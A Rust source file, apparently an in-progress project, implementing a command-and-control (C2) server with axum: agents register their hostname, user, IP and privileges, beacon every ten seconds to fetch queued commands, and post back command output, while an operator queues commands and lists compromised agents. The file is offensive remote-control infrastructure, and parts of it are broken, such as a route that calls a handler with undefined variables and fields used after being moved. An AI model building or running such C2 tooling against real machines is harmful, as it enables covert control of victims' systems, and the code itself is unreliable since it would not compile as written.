use axum::{
    Router,
    extract::State,
    http::StatusCode,
    response::Json,
    routing::{get, post},
};
use chrono::Utc;
use std::{
    collections::VecDeque,
    net::SocketAddr,
    sync::{Arc, Mutex},
};

use crate::models::*;

// Add missing struct definition if not present in models.rs

/// Start the C2 HTTP server
pub async fn start_server() {
    // Create shared state that will be accessible to all handlers
    let state = Arc::new(Mutex::new(AppState::new()));

    // Build the router with all endpoints
    let app = Router::new()
        .route("/api/register", post(handle_register))
        .route("/api/beacon", post(handle_beacon))
        .route("/api/result", post(handle_result))
        .route("/api/command", post(handle_queue_command))
        .route("/api/agents", get(handle_get_agents))
        .route(
            "/api/result/:id",
            get(handle_get_results(state, command_id)),
        )
        // TODO: Add more routes as you implement them
        // .route("/api/command", post(handle_queue_command))
        // .route("/api/agents", get(handle_list_agents))
        // .route("/api/result/:id", get(handle_get_result))
        .with_state(state);

    // Bind to address
    let addr = SocketAddr::from(([0, 0, 0, 0], 8080));
    println!("🚀 C2 Server listening on http://{}", addr);
    println!("📡 Waiting for agents to connect...\n");

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn handle_register(
    State(state): State<SharedState>,
    Json(req): Json<RegisterRequest>,
) -> Json<RegisterResponse> {
    println!("📥 Registration request from agent: {}", req.agent_id);

    let mut state = state.lock().unwrap();

    let agent = Agent {
        id: req.agent_id.clone(),
        hostname: req.hostname,
        os: req.os,
        os_version: req.os_version,
        user: req.user,
        ip: req.ip,
        privileges: req.privileges,
        version: req.version,
        last_seen: Utc::now(),
        first_seen: Utc::now(),
    };

    // Store agent in HashMap
    state.agents.insert(req.agent_id.clone(), agent.clone());

    // Initialize empty command queue for this agent
    state
        .command_queues
        .insert(req.agent_id.clone(), VecDeque::new());

    println!("✅ Agent registered: {} ({})", agent.hostname, agent.id);
    println!(
        "   OS: {} | User: {} | IP: {}",
        agent.os, agent.user, agent.ip
    );

    // Return success response
    Json(RegisterResponse {
        success: true,
        message: "Agent registered successfully".to_string(),
        beacon_interval: 10, // Agent should beacon every 10 seconds
    })
}

async fn handle_beacon(
    State(state): State<SharedState>,
    Json(req): Json<BeaconRequest>,
) -> Json<BeaconResponse> {
    println!("💓 Beacon from agent: {}", req.agent_id);

    let mut state = state.lock().unwrap();

    // Update the agent's last_seen timestamp
    if let Some(agent) = state.agents.get_mut(&req.agent_id) {
        agent.last_seen = Utc::now();
    } else {
        println!("⚠️ Warning: Beacon from unknown agent: {}", req.agent_id);
    }

    // Get pending commands from the queue
    let commands: Vec<Command> = if let Some(queue) = state.command_queues.get_mut(&req.agent_id) {
        queue.drain(..).collect() // Remove all commands and return them
    } else {
        Vec::new()
    };

    if !commands.is_empty() {
        println!("   📤 Sending {} command(s) to agent", commands.len());
    }

    Json(BeaconResponse { commands })
}

async fn handle_result(
    State(state): State<SharedState>,
    Json(req): Json<ResultRequest>,
) -> Json<ResultResponse> {
    println!("📨 Result received for command: {}", req.command_id);

    let mut state = state.lock().unwrap();

    let command_result = CommandResult {
        agent_id: req.agent_id.clone(),
        command_id: req.command_id.clone(),
        success: req.success,
        output: req.output.clone(),
        timestamp: Utc::now(),
    };

    state.results.insert(req.command_id.clone(), command_result);

    println!("   Output:\n{}", req.output);

    Json(ResultResponse { success: true })
}

// ============================================================================
// HELPER FUNCTIONS (FOR FUTURE USE)
// ============================================================================

/// Add a command to an agent's queue (will be called from CLI later)
pub fn queue_command(
    state: &mut AppState,
    agent_id: String,
    command_type: CommandType,
    payload: String,
) -> Result<String, String> {
    // Check if agent exists
    if !state.agents.contains_key(&agent_id) {
        return Err(format!("Agent {} not found", agent_id));
    }

    // Create command with unique ID
    let command_id = uuid::Uuid::new_v4().to_string();
    let command = Command {
        id: command_id.clone(),
        agent_id: agent_id.clone(),
        command_type,
        payload,
        created_at: Utc::now(),
    };

    // Add to queue
    if let Some(queue) = state.command_queues.get_mut(&agent_id) {
        queue.push_back(command);
        Ok(command_id)
    } else {
        Err("Failed to access command queue".to_string())
    }
}

pub fn handle_queue_command(
    State(state): State<SharedState>,
    Json(req): Json<Command>,
) -> Result<Json<CommandResult>, (StatusCode, String)> {
    let mut state = state.lock().unwrap();

    match queue_command(&mut state, req.agent_id, req.command_type, req.payload) {
        Ok(command_id) => Ok(Json(CommandResult {
            agent_id: req.agent_id,
            output: "".to_string(),
            timestamp: Utc::now(),
            success: true,
            command_id,
        })),
        Err(err) => Err((StatusCode::BAD_REQUEST, err)),
    }
}

/// Get all registered agents
pub fn get_agents(state: &AppState) -> Vec<Agent> {
    state.agents.values().cloned().collect()
}

pub fn handle_get_agents(State(state): State<SharedState>) -> Json<Vec<Agent>> {
    let state = state.lock().unwrap();
    let agents = get_agents(&state);
    Json(agents)
}

/// Get result for a command
pub fn get_result(state: &AppState, command_id: &str) -> Option<CommandResult> {
    state.results.get(command_id).cloned()
}

pub fn handle_get_results(
    State(state): State<SharedState>,
    command_id: String,
) -> Result<Json<CommandResult>, (StatusCode, String)> {
    let state = state.lock().unwrap();
    if let Some(result) = get_result(&state, &command_id) {
        Ok(Json(result))
    } else {
        Err((StatusCode::NOT_FOUND, "Result not found".to_string()))
    }
}
